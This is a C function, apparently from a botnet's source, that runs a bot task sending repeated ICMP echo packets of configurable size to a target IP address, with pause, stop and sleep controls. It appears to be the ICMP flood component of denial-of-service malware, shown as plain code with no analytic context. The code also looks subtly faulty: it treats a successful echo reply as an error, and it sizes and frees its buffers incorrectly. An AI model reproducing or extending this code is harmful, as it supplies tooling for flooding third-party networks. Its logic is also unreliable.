
//=======================================================================================
BOOLEAN StartIcmpJob(PBotTask IcmpJob)
{
	BOOLEAN bRet = FALSE;
	HANDLE hIcmpHandle = ICMPCreateFile();
	// Declare and initialize variables
	PCHAR pSendBuffer;
	LPVOID ReplyBuffer;
	ULONG nRet = 0;
	PBotIcmpJob Job= IcmpJob->Job;
	PICMP_ECHO_REPLY pEchoReply;

	pSendBuffer = ALLOC(Job->PacketSize);
	ReplyBuffer = (VOID *)ALLOC(sizeof(ICMP_ECHO_REPLY) + sizeof(Job->PacketSize));

	if(!hIcmpHandle || !pSendBuffer || !ReplyBuffer)
		goto end;

	do {
		if(IcmpJob->JobStatus == JOB_STATUS_PAUSE)
			goto sleep;

		nRet = ICMPSendEcho(hIcmpHandle,Job->addrTargetIp,pSendBuffer, (USHORT)(Job->PacketSize + sizeof(ICMP_ECHO_REPLY)),
			NULL, ReplyBuffer, sizeof(ReplyBuffer) + sizeof(ICMP_ECHO_REPLY),1000);

		pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"\tReceived %ld messages.\n", nRet);
		DbgMsgEx(__FILE__,__LINE__,"\tMessage: 0x%08X\n", pEchoReply->Data);
#endif
		// error send
		if(nRet != 0)
		{
			IcmpJob->JobStatus = JOB_STATUS_EXIT;
			IcmpJob->bStop = TRUE;
			break;
		}
sleep:
		api.pSleep(Global.IcmpSleepTime);

	}	while(IcmpJob->bStop != TRUE);
	
end:
	__try {
		if(pSendBuffer)
			FREE(pSendBuffer);
		if(hIcmpHandle)
			ICMPCloseHandle(hIcmpHandle);
		if(IcmpJob->bStop == TRUE)
		{
			DeleteJob(IcmpJob);
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"Error on free memory!\n");
#endif
	}
	return bRet;
}